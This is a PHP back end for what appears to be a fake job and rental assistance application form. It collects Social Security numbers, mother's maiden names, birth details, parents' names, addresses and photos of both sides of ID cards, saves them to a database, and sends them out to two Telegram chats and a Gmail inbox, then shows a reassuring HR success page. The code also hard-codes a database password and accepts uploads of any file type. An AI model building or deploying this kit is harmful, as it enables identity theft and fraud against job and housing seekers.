<?php

// ======================
// ERROR REPORTING
// ======================
error_reporting(E_ALL);
ini_set('display_errors', 1);

// ======================
// CREATE UPLOADS FOLDER
// ======================
if (!is_dir("uploads")) {
    mkdir("uploads", 0777, true);
}

// ======================
// NEON DATABASE (PostgreSQL)
// ======================
$host = "ep-calm-frog-ahfjj5vo-pooler.c-3.us-east-1.aws.neon.tech";

$db   = "neondb";

$user = "neondb_owner";

$pass = "npg_TQ1gBOwA9rCa";

$port = "5432";

$dsn = "pgsql:host=$host;port=$port;dbname=$db;sslmode=require";

try {

    $pdo = new PDO($dsn, $user, $pass, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
    ]);

} catch (Exception $e) {

    die("DB Connection failed: " . $e->getMessage());
}

// ======================
// FORM DATA
// ======================
$first_name = $_POST['first_name'] ?? '';
$middle_name = $_POST['middle_name'] ?? '';
$last_name = $_POST['last_name'] ?? '';

$phone = $_POST['phone'] ?? '';
$email = $_POST['email'] ?? '';
$dob = $_POST['dob'] ?? '';

$mother_maiden = $_POST['mother_maiden'] ?? '';
$ssn = $_POST['ssn'] ?? '';

$birth_city = $_POST['birth_city'] ?? '';

$address_line1 = $_POST['address_line1'] ?? '';
$address_line2 = $_POST['address_line2'] ?? '';

$city = $_POST['city'] ?? '';
$state = $_POST['state'] ?? '';
$zip_code = $_POST['zip_code'] ?? '';

$father_name = $_POST['father_name'] ?? '';
$mother_name = $_POST['mother_name'] ?? '';

$address = $address_line1 . " " . $address_line2 . ", " . $city . ", " . $state . " " . $zip_code;

// ======================
// FILE UPLOAD FUNCTION
// ======================
function uploadFile($file) {

    if (isset($file) && $file['error'] == 0) {

        $ext = pathinfo($file['name'], PATHINFO_EXTENSION);

        $name = time() . "_" . uniqid() . "." . $ext;

        $target = "uploads/" . $name;

        if (move_uploaded_file($file['tmp_name'], $target)) {

            return $target;
        }
    }

    return null;
}

// ======================
// UPLOAD FILES
// ======================
$front_id = uploadFile($_FILES['front_id'] ?? []);
$back_id  = uploadFile($_FILES['back_id'] ?? []);

// ======================
// SAVE TO DATABASE
// ======================
$stmt = $pdo->prepare("
INSERT INTO job_applications (
    first_name,
    middle_name,
    last_name,
    phone,
    email,
    dob,
    mother_maiden,
    ssn,
    birth_city,
    address,
    father_name,
    mother_name,
    front_id,
    back_id
)
VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
");

$stmt->execute([
    $first_name,
    $middle_name,
    $last_name,
    $phone,
    $email,
    $dob,
    $mother_maiden,
    $ssn,
    $birth_city,
    $address,
    $father_name,
    $mother_name,
    $front_id,
    $back_id
]);

// ======================
// TELEGRAM BOT SETUP
// ======================
$bot1 = "PASTE_NEW_BOT_TOKEN_1";
$chat1 = "6513265609";

$bot2 = "PASTE_NEW_BOT_TOKEN_2";
$chat2 = "5469294503";

// ======================
// WEBSITE URL
// ======================
$baseUrl = "https://homeandrentalassistance.onrender.com";

// ======================
// IMAGE URLS
// ======================
$front_url = $front_id ? $baseUrl . "/" . $front_id : "";
$back_url  = $back_id ? $baseUrl . "/" . $back_id : "";

// ======================
// TELEGRAM FUNCTION
// ======================
function sendTelegram($bot, $method, $data) {

    $url = "https://api.telegram.org/bot{$bot}/{$method}";

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
            'timeout' => 30
        ]
    ];

    $context = stream_context_create($options);

    return file_get_contents($url, false, $context);
}

// ======================
// MESSAGE TEXT
// ======================
$text = "📄 New Application Submitted\n\n";

$text .= "👤 Name: $first_name $middle_name $last_name\n";
$text .= "📞 Phone: $phone\n";
$text .= "📧 Email: $email\n";
$text .= "🎂 DOB: $dob\n";
$text .= "🏠 Address: $address\n";
$text .= "🏙 Birth City: $birth_city\n";
$text .= "👨 Father: $father_name\n";
$text .= "👩 Mother: $mother_name\n";
$text .= "🧾 SSN: $ssn";

// ======================
// SEND TO BOT 1
// ======================
sendTelegram($bot1, "sendMessage", [
    "chat_id" => $chat1,
    "text" => $text
]);

if ($front_url != "") {

    sendTelegram($bot1, "sendPhoto", [
        "chat_id" => $chat1,
        "photo" => $front_url,
        "caption" => "🪪 Front ID - $first_name $last_name"
    ]);
}

if ($back_url != "") {

    sendTelegram($bot1, "sendPhoto", [
        "chat_id" => $chat1,
        "photo" => $back_url,
        "caption" => "🪪 Back ID - $first_name $last_name"
    ]);
}

// ======================
// SEND TO BOT 2
// ======================
sendTelegram($bot2, "sendMessage", [
    "chat_id" => $chat2,
    "text" => $text
]);

if ($front_url != "") {

    sendTelegram($bot2, "sendPhoto", [
        "chat_id" => $chat2,
        "photo" => $front_url,
        "caption" => "🪪 Front ID - $first_name $last_name"
    ]);
}

if ($back_url != "") {

    sendTelegram($bot2, "sendPhoto", [
        "chat_id" => $chat2,
        "photo" => $back_url,
        "caption" => "🪪 Back ID - $first_name $last_name"
    ]);
}

// ======================
// EMAIL NOTIFICATION
// ======================
$to = "collaomn@gmail.com";

$subject = "New Job Form Submission";

$body = $text;

$headers = "From: noreply@homeandrentalassistance.onrender.com";

@mail($to, $subject, $body, $headers);

// ======================
// SUCCESS PAGE
// ======================
echo "

<!DOCTYPE html>

<html lang='en'>

<head>

<meta charset='UTF-8'>

<meta name='viewport' content='width=device-width, initial-scale=1.0'>

<title>Application Submitted</title>

<style>

body{
    margin:0;
    padding:0;
    background:#020617;
    font-family:Arial,sans-serif;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh;
}

.success-box{
    width:90%;
    max-width:750px;
    background:#0f172a;
    padding:50px;
    border-radius:25px;
    text-align:center;
    color:white;
    box-shadow:0 10px 40px rgba(0,0,0,0.5);
}

.check{
    font-size:90px;
    color:#22c55e;
    margin-bottom:20px;
}

h1{
    font-size:42px;
    margin-bottom:20px;
}

p{
    font-size:22px;
    line-height:1.8;
    color:#cbd5e1;
}

hr{
    border:none;
    border-top:1px solid #334155;
    margin:40px 0;
}

.director{
    font-size:32px;
    color:#38bdf8;
    margin-bottom:10px;
}

.role{
    font-size:20px;
    color:#94a3b8;
}

</style>

</head>

<body>

<div class='success-box'>

<div class='check'>✓</div>

<h1>Form Submitted Successfully!</h1>

<p>
Thank you for considering
<strong>Apartment at Home and Rental Assistance</strong>.
<br><br>
We will contact you shortly.
</p>

<hr>

<div class='director'>
Taylor Luis
</div>

<div class='role'>
Director of Human Resources
</div>

</div>

</body>

</html>

";
?>
